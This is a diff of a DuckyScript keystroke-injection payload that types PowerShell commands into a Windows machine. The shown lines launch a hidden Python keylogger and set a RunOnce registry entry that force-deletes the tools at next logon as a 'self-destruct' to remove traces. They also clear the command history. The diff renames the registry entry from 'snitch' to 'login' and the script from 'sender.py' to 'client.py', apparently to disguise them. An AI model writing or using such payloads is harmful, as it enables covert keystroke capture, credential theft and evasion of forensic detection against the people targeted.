@@ -20,10 +20,10 @@ STRINGLN Remove-Item "$zippedTools"
 
 REM Implement a self-destruct protocol to delete all traces upon logout/reboot/shutdown
 STRINGLN $deleteCommand = "powershell -w h -c `"Remove-Item -Path '$tools' -Recurse -Force`""
-STRINGLN Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\RunOnce" -Name "snitch" -Value $deleteCommand
+STRINGLN Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\RunOnce" -Name "login" -Value $deleteCommand
 
 REM Start the keylogger in the background
-STRINGLN & "$tools\pythonw.exe" "$tools\sender.py"
+STRINGLN & "$tools\pythonw.exe" "$tools\client.py"
 
 REM Cleanup tasks and exit
 STRINGLN Clear-History
